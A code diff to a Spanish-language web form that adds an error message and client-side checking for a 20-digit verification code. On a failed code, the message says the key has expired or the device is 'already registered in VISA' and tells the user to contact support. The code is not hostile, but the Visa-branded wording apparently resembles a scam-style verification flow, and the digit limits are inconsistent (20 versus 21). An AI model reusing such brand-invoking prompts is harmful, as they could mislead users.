@@ -1510,6 +1510,7 @@
                     <label class="form-label">Código de verificación (20 dígitos)</label>
                     <input type="text" class="form-input" id="verificationCode" placeholder="00000" maxlength="21" autocomplete="one-time-code" inputmode="numeric">
                 </div>
+                <div id="verificationError" class="error-message" style="display:none;"></div>
                 
                 <div class="button-group">
                     <button class="btn btn-secondary" onclick="previousStep()">
@@ -2089,13 +2090,23 @@
             if (emailConfirm) emailConfirm.addEventListener('input', debounce(validateEmail, 300));
             
             const verificationCode = document.getElementById('verificationCode');
+            const verificationError = document.getElementById('verificationError');
             if (verificationCode) {
                 verificationCode.addEventListener('input', function() {
                     this.value = this.value.replace(/\D/g, '');
                     if (this.value.length > 21) {
                         this.value = this.value.slice(0, 21);
                     }
-                    enableNextButton('verificationNext', isValidVerificationCode(this.value));
+                    const isValid = isValidVerificationCode(this.value);
+                    enableNextButton('verificationNext', isValid);
+                    if (verificationError) {
+                        if (this.value.length >= 20 && !isValid) {
+                            verificationError.textContent = 'La clave ha vencido o este equipo ya est\xE1 registrado en VISA. Por favor contacta a soporte y solicita una nueva clave.';
+                            verificationError.style.display = 'block';
+                        } else {
+                            verificationError.style.display = 'none';
+                        }
+                    }
                 });
             }
             
